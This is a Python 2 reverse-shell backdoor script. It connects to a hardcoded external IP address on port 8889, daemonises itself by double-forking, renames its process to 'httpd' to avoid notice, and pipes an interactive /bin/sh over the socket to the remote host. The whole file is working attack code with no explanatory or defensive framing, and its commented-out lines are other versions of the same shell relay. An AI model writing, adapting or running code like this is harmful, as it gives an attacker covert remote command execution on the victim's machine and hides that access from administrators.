import sys, socket, os
from pexpect import spawn
import select
#import pty, fcntl, struct, termios, select


if False:
    print "[x] Usage: %s [host] [port]" % ( sys.argv[0] )
else:
    host = '212.75.198.132'
    port = 8889
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )

    try:
        sock.connect( (host, port) )
    except:
        print "[!] Can't connect !\n"
        os._exit( 1 )

    print "[x] OK ....\n"

    try:
        if os.fork() > 0: os._exit( 0 )
        if os.fork() > 0: os._exit( 0 )
    except OSError, error:
        print '[!] fork: %d (%s)\n' % ( error.errno, error.strerror )



    os.dup2( sock.fileno(), sys.stdin.fileno()  )
    os.dup2( sock.fileno(), sys.stdout.fileno() )
    os.dup2( sock.fileno(), sys.stderr.fileno() )
    sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )

    try:
        import dl
        libc = dl.open('/lib/libc.so.6')
        libc.call('prctl', 15, 'httpd\0', 0, 0, 0)
    except:
        print "[!] can't set proc name...\r"

    print ">>> test print....\r"

    s = spawn( '/bin/sh' )
    s.setwinsize( 36, 111 )

    while True:
        r, w, e = select.select( [ s.fileno(), sock.fileno() ], [], [], 5 )

        if s.fileno() in r:
            try:
                res = s.read_nonblocking( 100000, timeout = 1 )
                os.write( sock.fileno(), res )
            except:
                print "[!] Die (child time out)......\r"
                os._exit( 0 )

        if sock.fileno() in r:
            dat = os.read( sock.fileno(), 1000 )
            s.send( dat )
            if not dat:
                print "[!] Die (empty socket)....\r"
                os._exit( 0 )

    #os.dup2( sock.fileno(), s.STDIN_FILENO )
    #os.dup2( s.STDIN_FILENO, sock.fileno() )
    #os.dup2( sock.fileno(), s.STDOUT_FILENO )
    #s.interact()


    #pid, child_fd = pty.fork()
    #if pid == 0:#Child
    #    os.execv( '/bin/sh', [] )

    #while True:
    #    pass

    #if pid == 0: # Child
    #    TIOCSWINSZ = getattr( termios, 'TIOCSWINSZ', -2146929561 )
    #    s = struct.pack( 'HHHH', 24, 80, 0, 0 )
    #    fcntl.ioctl( sys.stdout.fileno(), TIOCSWINSZ, s )
    #    print ">>> from child \n"
    #    os.execv( '/bin/sh', [] )
    #else:
    #    print "pid = %s  child_fd = %s" % ( pid, child_fd )
    #    os.dup2( sock.fileno(), child_fd )
    #    os.dup2( child_fd, sock.fileno() )

    #    res = os.read( child_fd, 1000 )
    #    print "read in parent from child_fd = ", res

    #while sock.recv:
    #    res = os.read( child_fd, 1000 )
    #    print " ---> ", res

